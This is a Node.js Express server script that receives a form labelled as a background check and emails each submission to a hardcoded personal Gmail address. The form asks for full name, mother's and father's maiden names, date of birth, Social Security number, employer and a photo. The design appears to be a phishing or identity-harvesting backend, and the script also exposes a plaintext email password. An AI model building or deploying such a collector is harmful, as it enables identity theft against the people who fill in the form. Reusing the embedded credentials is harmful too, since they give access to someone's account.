const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const multer = require('multer');
const path = require('path');

const app = express();
const port = 3000;

// Set up body parser to handle POST data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Set up static folder for HTML, CSS, JS files
app.use(express.static('public'));

// Set up multer for file uploads (optional: for photo uploads)
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'uploads/');
  },
  filename: function (req, file, cb) {
    cb(null, Date.now() + path.extname(file.originalname)); // Save file with unique name
  },
});
const upload = multer({ storage: storage });

// Set up Nodemailer transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'davmcgee147@gmail.com', // Your email
    pass: 'Onireason@147',   // Your email password (or app password if using 2FA)
  },
});

// Handle form submission
app.post('/submit-form', upload.single('photo'), (req, res) => {
  const { fullname, maidenname, fathermaidenname, dob, ssn, email, section } = req.body;

  // Prepare email options
  const mailOptions = {
    from: 'mailto:your-email@gmail.com',  // Sender address
    to: 'davmcgee147@gmail.com',  // Replace with the email where you want to receive form data
    subject: 'New Background Check Submission',
    text: `
      Full Name: ${fullname}
      Mother's Maiden Name: ${maidenname}
      Father's Maiden Name: ${fathermaidenname}
      Date of Birth: ${dob}
      SSN: ${ssn}
      Email: ${email}
      Employer: ${section}
    `,
    attachments: [
      {
        filename: req.file ? req.file.originalname : '',
        path: req.file ? req.file.path : '', // Attach the uploaded photo
      },
    ],
  };

  // Send email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      return res.status(500).send('Error in sending email');
    }
    res.status(200).send('Form submitted successfully');
  });
});

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});